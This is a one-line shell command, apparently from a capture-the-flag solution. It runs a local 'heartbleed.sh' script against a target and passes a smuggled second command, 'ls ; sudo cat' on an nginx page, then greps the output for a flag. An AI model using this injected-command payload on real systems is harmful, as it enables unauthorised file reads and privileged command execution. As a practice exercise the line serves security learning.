./heartbleed.sh $1 "ls ; sudo cat /usr/local/nginx/html/index_https.html" | grep -o 'flag2{.*}'